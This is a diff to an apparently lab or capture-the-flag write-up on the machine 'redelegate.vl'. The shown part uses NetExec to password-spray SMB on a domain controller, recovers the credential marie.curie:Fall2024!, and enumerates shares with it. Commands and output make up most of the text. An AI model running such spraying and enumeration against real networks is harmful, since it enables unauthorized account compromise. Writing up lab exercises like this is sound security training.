@@ -463,7 +463,7 @@ Administrator
 ```
 I can now use this to enumerate further
 
-# Password spray
+# Password spray leads to user compromise
 So i have all the passwords in a file and now a user list so ill do a password spray
 
 ```python
@@ -471,4 +471,21 @@ nxc smb dc.redelegate.vl -u users.txt -p passwords.txt --continue-on-success
 
 SMB         10.129.234.50   445    DC               [+] redelegate.vl\marie.curie:Fall2024!
 ```
+Found a valid user
+
+```python
+nxc smb dc.redelegate.vl -u 'marie.curie' -p 'Fall2024!' --shares            
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\marie.curie:Fall2024! 
+SMB         10.129.234.50   445    DC               [*] Enumerated shares
+SMB         10.129.234.50   445    DC               Share           Permissions     Remark
+SMB         10.129.234.50   445    DC               -----           -----------     ------
+SMB         10.129.234.50   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.50   445    DC               C$                              Default share
+SMB         10.129.234.50   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.50   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.234.50   445    DC               SYSVOL          READ            Logon server share
+```
+No interesting 
+
 
